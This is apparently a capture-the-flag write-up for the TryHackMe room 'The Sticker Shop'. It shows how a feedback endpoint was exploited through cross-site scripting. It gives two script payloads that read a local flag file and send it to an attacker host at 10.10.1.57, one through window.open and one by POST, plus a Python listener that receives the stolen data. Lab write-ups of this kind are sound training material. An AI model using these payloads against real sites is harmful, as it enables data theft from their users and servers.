---
title: The Sticker Shop
categories: [TryHackMe]
tags: [web, easy,]
image: images/The Sticker Shop/The Sticker Shop.jpg
---

**The Sticker Shop** is a **easy** rated room on **TryHackMe**,


We inspected the webpage by opening the site and using the **Inspect Element** tool. During this process, we found an endpoint named `submit_feedback`.  

We then navigated to the URL:  
`http://10.10.50.243:8080/submit_feedback`.  

This raised the possibility of a **Cross-Site Scripting (XSS)** vulnerability.  

To investigate further, we proceeded with testing the endpoint for XSS exploits.



# ●methode 1

## let open our python serveur
```console
python3.9 -m http.server
```

```console

base64:

<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(data => {
    window.open(`http://10.10.1.57:8015?flag=${btoa(data)}`, '_blank');
  });
</script>
``` 


<img src="images/The Sticker Shop/methode 1/flag.PNG" alt="The Sticker Shop" width="700"/>

## let go to CyberChef

<img src="images/The Sticker Shop/methode 1/flag1.PNG" alt="The Sticker Shop" width="700"/>




# ●methode 2

create a file `script.py` 

simple python server to accept post request.

```console
from http.server import HTTPServer, BaseHTTPRequestHandler

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Read the length of the POST data
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Print the data (or save it to a file)
        print("Received data:", post_data.decode())
        
        # Send a response to the client
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Data received")

# Start the server
server_address = ('', 8000)  # Listen on all interfaces, port 8000
httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
print("Listening on port 8000...")
httpd.serve_forever()
```


```console
<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(data => {
    fetch('http://10.10.1.57:8015', { 
      method: 'POST',
      body: data
    });
  });
</script>
```
<img src="images/The Sticker Shop/methode2/flag1.PNG" alt="The Sticker Shop" width="700"/>



